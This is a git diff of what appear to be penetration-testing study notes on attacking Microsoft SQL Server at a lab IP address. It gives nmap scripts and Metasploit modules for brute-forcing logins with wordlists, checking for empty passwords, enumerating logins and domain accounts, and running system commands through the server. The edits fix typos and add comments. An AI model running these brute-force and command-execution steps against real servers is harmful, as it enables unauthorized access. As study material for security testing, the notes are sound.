@@ -589,7 +589,7 @@ nmap 192.32.122.3 -p 1433 --script=ms-sql-ntlm-info --script-args mssql.instance
 # above code spits out target_name and netbios info
 
 #brute force username and password
-nmap 192.32.122.3 -p 1433 --script=ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-commoon-passwords.txt
+nmap 192.32.122.3 -p 1433 --script=ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
 
 #check for empty passwords
 nmap 192.32.122.3 -p 1433 --script=ms-sql-empty-password
@@ -610,7 +610,7 @@ impt: For any version of sql can always check the nse site for useful scriptes t
 if u know nothing bf everything
 ```msfconsole
 use auxiliary/scanner/mssql/mssql_login
-set pass_file /root/Desktop/wordlist/common_users.txt
+set user_file /root/Desktop/wordlist/common_users.txt
 set pass_file /root/Desktop/wordlist/100-common-passwords.txt
 set verbose false
 ```
@@ -618,16 +618,24 @@ set verbose false
 Enumerate if user received (requires authentication is found)
 ```msfconsole
 #enum the server using creds found before
+#can see that xp_cmdshell enabled needed for the next part
 use auxiliary/admin/mssql/mssql_enum
 
-#enumerate the users
+#enumerate the users tru the server logins incase any were missed before
 use auxiliary/admin/mssql/mssql_enum_sql_logins
 
 #try to run comands (whoami in this case) using a given set of creds
 use auxiliary/admin/mssql/mssql_exec
 set cmd whoami
 
-#brute force to find domain accts
+#brute force to find system accounts domain accts
 use auxiliary/admin/mssql/mssql_enum_domain_accounts
 
 ```
+
+
+
+
+
+# Vulnerability assesment
+
